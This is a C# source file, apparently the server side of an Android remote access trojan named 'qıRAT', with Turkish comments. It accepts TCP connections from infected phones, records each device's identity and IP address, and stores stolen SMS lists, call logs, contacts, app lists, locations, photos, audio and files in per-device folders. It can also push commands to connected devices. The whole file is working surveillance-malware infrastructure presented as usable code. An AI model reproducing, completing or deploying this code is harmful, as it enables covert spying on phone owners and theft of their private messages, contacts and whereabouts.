using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Web;
using System.IO;

namespace qıRAT
{
    // Device bilgilerini tutacak sinif
    public class DeviceInfo
    {
        public string Model { get; set; }
        public string Manufacturer { get; set; }
        public string AndroidVersion { get; set; }
        public string DeviceID { get; set; }
        public string IPAddress { get; set; }
        public TcpClient Client { get; set; }
        public string FolderPath { get; set; } // Client klasor yolu
        public DateTime LastPingTime { get; set; } = DateTime.Now; // Son ping zamani
    }

    internal class socket
    {
        private static TcpListener listener;
        private static Thread listenerThread;
        private static Thread heartbeatMonitorThread;
        private static bool isListening = false;
        public static string ListeningIP { get; private set; }
        public static int ListeningPort { get; private set; }

        // Bagli clientlari tutan liste
        private static List<TcpClient> connectedClients = new List<TcpClient>();
        
        // Device ID -> DeviceInfo mapping
        private static Dictionary<string, DeviceInfo> deviceMap = new Dictionary<string, DeviceInfo>();
        private static object deviceMapLock = new object(); // Thread safety icin kilit

        // Gelen toplam byte sayisi
        private static long totalBytesReceived = 0;
        private static object bytesLock = new object();
        // Yeni client baglandiginda tetiklenen event
        public static event EventHandler<TcpClient> ClientConnected;

        // Yeni device bilgisi geldiginde tetiklenen event
        public static event EventHandler<DeviceInfo> DeviceInfoReceived;

        // Client baglanti kesildiginde tetiklenen event
        public static event EventHandler<DeviceInfo> ClientDisconnected;
        
        // Fotograf geldiginde tetiklenen event (Device, JsonData)
        public static event EventHandler<Tuple<DeviceInfo, string>> PhotoReceived;

        // Belirtilen IP ve port'ta dinlemeyi baslat
        public static void StartListening(string ip, int port)
        {
            if (isListening)
            {
                StopListening();
            }

            try
            {
                ListeningIP = ip;
                ListeningPort = port;

                // Byte sayacini sifirla
                lock (bytesLock)
                {
                    totalBytesReceived = 0;
                }

                IPAddress ipAddress = IPAddress.Parse(ip);
                listener = new TcpListener(ipAddress, port);
                listener.Start();
                isListening = true;

                listenerThread = new Thread(ListenForClients);
                listenerThread.IsBackground = true;
                listenerThread.Start();

                // Heartbeat monitor thread baslat
                heartbeatMonitorThread = new Thread(CheckHeartbeats);
                heartbeatMonitorThread.IsBackground = true;
                heartbeatMonitorThread.Start();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to start listening: {ex.Message}");
            }
        }

        // Gelen client baglantilarini dinle
        private static void ListenForClients()
        {
            try
            {
                while (isListening)
                {
                    if (listener.Pending())
                    {
                        TcpClient client = listener.AcceptTcpClient();
                        connectedClients.Add(client);

                        // Yeni baglanti icin event tetikle
                        ClientConnected?.Invoke(null, client);

                        // Her client icin ayri thread baslat
                        Thread clientThread = new Thread(() => HandleClient(client));
                        clientThread.IsBackground = true;
                        clientThread.Start();
                    }
                    else
                    {
                        Thread.Sleep(100);
                    }
                }
            }
            catch (Exception ex)
            {
                // Sessiz hata - arka plan calismasi
            }
        }

        // Her client ile iletisimi yonet
        private static void HandleClient(TcpClient client)
        {
            NetworkStream stream = null;
            StreamReader reader = null;
            DeviceInfo currentDevice = null;
            
            try
            {
                stream = client.GetStream();
                // UTF8 encoding ile reader olustur
                reader = new StreamReader(stream, Encoding.UTF8);

                while (client.Connected && isListening)
                {
                    try 
                    {
                        // Bloke edici okuma - ReadLine satir gelene kadar bekler
                        string line = reader.ReadLine();
                        
                        if (line != null) {
                             System.Diagnostics.Debug.WriteLine($"[RAW RECV] {line}");
                        }
                        
                        if (line == null) break; // Baglanti koptu

                        if (!string.IsNullOrWhiteSpace(line))
                        {
                            // Gelen byte sayisini tahmini ekle
                            lock (bytesLock)
                            {
                                totalBytesReceived += line.Length;
                            }

                            if (currentDevice == null)
                            {
                                // Ilk veri device info olmali
                                currentDevice = ProcessReceivedData(client, line.Trim());
                            }
                            else
                            {
                                // Device tanimliysa veriyi isle
                                ProcessDataCommand(currentDevice, line.Trim());
                            }
                        }
                    }
                    catch (IOException) 
                    {
                        break; // Baglanti hatasi
                    }
                    catch (Exception)
                    {
                        // Veri isleme hatasi (ProcessReceivedData icinde)
                    }
                }
            }
            catch (Exception ex)
            {
                // Sessiz hata - arka plan calismasi
            }
            finally
            {
                reader?.Close();
                client?.Close();
                connectedClients.Remove(client);
                
                if (currentDevice != null)
                {
                    // Baglanti koptugunda eventi tetikle
                    ClientDisconnected?.Invoke(null, currentDevice);
                    
                    lock (deviceMapLock)
                    {
                        if (deviceMap.ContainsKey(currentDevice.DeviceID))
                        {
                            deviceMap.Remove(currentDevice.DeviceID);
                        }
                    }
                }
            }
        }

        // Clienttan alinan veriyi isle
        private static DeviceInfo ProcessReceivedData(TcpClient client, string data)
        {
            try
            {
                // DEBUG
                System.Diagnostics.Debug.WriteLine($"[DEBUG] ProcessReceivedData: {data}");
                
                // Java kodundan gelen format: model=XXX&manf=XXX&release=XXX&id=XXX
                if (data.Contains("model=") && data.Contains("manf=") && 
                    data.Contains("release=") && data.Contains("id="))
                {
                    DeviceInfo deviceInfo = ParseDeviceInfo(data, client);
                    if (deviceInfo != null)
                    {
                        // Device'i map'e ekle (Thread-safe)
                        lock (deviceMapLock)
                        {
                            if (deviceMap.ContainsKey(deviceInfo.DeviceID))
                            {
                                deviceMap[deviceInfo.DeviceID] = deviceInfo;
                            }
                            else
                            {
                                deviceMap.Add(deviceInfo.DeviceID, deviceInfo);
                            }
                        }
                        
                        // DEBUG
                        System.Diagnostics.Debug.WriteLine($"[DEBUG] Device added: {deviceInfo.Model} - {deviceInfo.DeviceID}");
                        
                        // Device bilgisi event'i tetikle
                        DeviceInfoReceived?.Invoke(null, deviceInfo);
                        
                        return deviceInfo;
                    }
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"[ERROR] ProcessReceivedData: {ex.Message}");
            }
            return null;
        }

        // Gelen data komutlarini isle (SMS_LIST, CONTACTS vb.)
        private static void ProcessDataCommand(DeviceInfo device, string data)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(data))
                    return;

                if (data == "PING")
                {
                    // Ping mesajini guncelle
                    device.LastPingTime = DateTime.Now;
                    return;
                }

                if (!data.Contains(":"))
                    return;

                // Format: COMMAND:JSON_DATA
                int colonIndex = data.IndexOf(':');
                string command = data.Substring(0, colonIndex).Trim();
                string jsonData = data.Substring(colonIndex + 1).Trim();

                // Client klasorune kaydet
                SaveDataToClientFolder(device, command, jsonData);
            }
            catch (Exception ex)
            {
                // Sessiz hata
            }
        }

        // Veriyi client klasorune kaydet
        private static void SaveDataToClientFolder(DeviceInfo device, string dataType, string jsonData)
        {
            try
            {
                if (device == null || string.IsNullOrWhiteSpace(device.FolderPath))
                    return;

                string fileName = "";
                switch (dataType)
                {
                    case "SMS_LIST":
                        fileName = "sms.json";
                        break;
                    case "CALL_LOGS":
                        fileName = "calls.json";
                        break;
                    case "CONTACTS":
                        fileName = "contacts.json";
                        break;
                    case "APP_LIST":
                        fileName = "applications.json";
                        break;
                    case "LOCATION":
                        fileName = "location.json";
                        break;
                    case "CAMERA_LIST":
                        fileName = "cameras.json";
                        break;
                    case "FILE_LIST":
                        fileName = "files.json";
                        break;
                    case "PHOTO":
                        fileName = $"photo_{DateTime.Now:yyyyMMdd_HHmmss}.json";
                        PhotoReceived?.Invoke(null, new Tuple<DeviceInfo, string>(device, jsonData));
                        break;
                    case "AUDIO":
                        fileName = $"audio_{DateTime.Now:yyyyMMdd_HHmmss}.json";
                        break;
                    case "FILE":
                        fileName = $"file_{DateTime.Now:yyyyMMdd_HHmmss}.json";
                        break;
                    default:
                        fileName = $"{dataType.ToLower()}_{DateTime.Now:yyyyMMdd_HHmmss}.json";
                        break;
                }

                string filePath = Path.Combine(device.FolderPath, fileName);
                File.WriteAllText(filePath, jsonData, Encoding.UTF8);
            }
            catch (Exception ex)
            {
                // Sessiz hata
            }
        }

        // Query string formatindaki veriyi parse et
        private static DeviceInfo ParseDeviceInfo(string queryString, TcpClient client)
        {
            try
            {
                DeviceInfo info = new DeviceInfo();
                info.Client = client;
                
                // IP adresini al
                IPEndPoint remoteEndPoint = client.Client.RemoteEndPoint as IPEndPoint;
                if (remoteEndPoint != null)
                {
                    info.IPAddress = remoteEndPoint.Address.ToString();
                }

                // Query string'i parse et
                string[] pairs = queryString.Split('&');
                foreach (string pair in pairs)
                {
                    string[] keyValue = pair.Split('=');
                    if (keyValue.Length == 2)
                    {
                        string key = keyValue[0].Trim();
                        string value = Uri.UnescapeDataString(keyValue[1].Trim());

                        switch (key.ToLower())
                        {
                            case "model":
                                // Ilk harfi buyuk yap (Title Case)
                                info.Model = System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(value.ToLower());
                                break;
                            case "manf":
                                info.Manufacturer = value;
                                break;
                            case "release":
                                info.AndroidVersion = value;
                                break;
                            case "id":
                                info.DeviceID = value;
                                break;
                        }
                    }
                }

                // Client klasor yolunu olustur - Model + ID'nin ilk 6 hanesi
                string shortId = info.DeviceID.Length > 6 ? info.DeviceID.Substring(0, 6) : info.DeviceID;
                string safeFolderName = string.Join("_", info.Model.Split(Path.GetInvalidFileNameChars())) + "_" + shortId;
                
                string basePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "client");
                info.FolderPath = Path.Combine(basePath, safeFolderName);

                // Klasoru olustur (eger yoksa)
                if (!Directory.Exists(info.FolderPath))
                {
                    Directory.CreateDirectory(info.FolderPath);
                }

                // Device bilgisini kaydet
                string infoContent = $"Device ID: {info.DeviceID}\n" +
                                     $"Model: {info.Model}\n" +
                                     $"Manufacturer: {info.Manufacturer}\n" +
                                     $"Android Version: {info.AndroidVersion}\n" +
                                     $"IP Address: {info.IPAddress}\n" +
                                     $"First Connection: {DateTime.Now}";
                
                File.WriteAllText(Path.Combine(info.FolderPath, "info.txt"), infoContent);

                return info;
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        // Belirli bir cliente veri gonder
        public static void SendData(TcpClient client, string data)
        {
            try
            {
                if (client != null && client.Connected)
                {
                    NetworkStream stream = client.GetStream();
                    byte[] buffer = Encoding.UTF8.GetBytes(data + "\n");
                    stream.Write(buffer, 0, buffer.Length);
                }
            }
            catch (Exception ex)
            {
                // Sessiz hata - arka plan calismasi
            }
        }

        // Tum bagli clientlara veri gonder
        public static void BroadcastData(string data)
        {
            foreach (var client in connectedClients.ToList())
            {
                SendData(client, data);
            }
        }

        // Toplam gelen byte sayisini al ve sifirla
        public static long GetAndResetBytesReceived()
        {
            lock (bytesLock)
            {
                long bytes = totalBytesReceived;
                totalBytesReceived = 0;
                return bytes;
            }
        }

        // Toplam gelen byte sayisini al (sifirlamadan)
        public static long GetTotalBytesReceived()
        {
            lock (bytesLock)
            {
                return totalBytesReceived;
            }
        }

        // Dinlemeyi durdur ve tum baglantilari kapat
        public static void StopListening()
        {
            try
            {
                isListening = false;

                // Tum bagli clientlari kapat
                foreach (var client in connectedClients.ToList())
                {
                    client?.Close();
                }
                connectedClients.Clear();
                connectedClients.Clear();
                lock (deviceMapLock)
                {
                    deviceMap.Clear();
                }

                listener?.Stop();
                listener = null;
            }
            catch (Exception ex)
            {
                // Sessiz hata - arka plan calismasi
            }
        }

        // Dinleme durumunu kontrol et
        public static bool IsListening()
        {
            return isListening;
        }

        // Bagli client sayisini al
        public static int GetConnectedClientsCount()
        {
            return connectedClients.Count;
        }

        // Bagli clientlarin listesini al
        public static List<TcpClient> GetConnectedClients()
        {
            return new List<TcpClient>(connectedClients);
        }

        // Device ID'ye gore DeviceInfo al
        public static DeviceInfo GetDeviceInfo(string deviceID)
        {
            lock (deviceMapLock)
            {
                if (deviceMap.ContainsKey(deviceID))
                {
                    return deviceMap[deviceID];
                }
            }
            return null;
        }
    

        // Heartbeat kontrolu yapan thread worker
        private static void CheckHeartbeats()
        {
            while (isListening)
            {
                try
                {
                    List<DeviceInfo> devicesToCheck;
                    lock (deviceMapLock)
                    {
                        devicesToCheck = deviceMap.Values.ToList();
                    }
                    
                    DateTime now = DateTime.Now;

                    foreach (var device in devicesToCheck)
                    {
                        // 20 saniyeden fazla suredir ping gelmediyse offline kabul et
                        if ((now - device.LastPingTime).TotalSeconds > 20)
                        {
                            // Baglantiyi kapat
                            try { device.Client?.Close(); } catch { }
                            
                            // Disconnect eventini tetikle
                            ClientDisconnected?.Invoke(null, device);
                            
                            // Map'ten cikar (Thread-safe)
                            lock (deviceMapLock)
                            {
                                if (deviceMap.ContainsKey(device.DeviceID))
                                {
                                    deviceMap.Remove(device.DeviceID);
                                }
                            }
                        }
                    }
                }
                catch
                {
                    // Sessiz hata
                }

                Thread.Sleep(5000); // 5 saniyede bir kontrol et
            }
        }
    }
}
